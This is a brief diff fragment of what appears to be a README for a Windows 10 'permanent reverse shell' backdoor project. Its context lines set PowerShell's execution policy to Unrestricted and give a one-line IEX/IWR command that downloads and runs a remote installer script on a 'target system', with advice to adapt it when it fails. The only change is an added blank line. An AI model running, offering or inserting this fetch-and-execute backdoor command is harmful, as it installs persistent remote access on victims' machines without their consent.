@@ -53,4 +53,5 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 ```powershell
 powershell.exe  IEX(IWR https://raw.githubusercontent.com/alariordas/PermanentRevershell-win10backdoor/main/ncinstaller.ps1 -UseBasicParsing);
 ```
+
 The script will be executed automatically. However, please note that it may not work on all systems. If you encounter issues, you may need to adapt the script to the target system's properties.
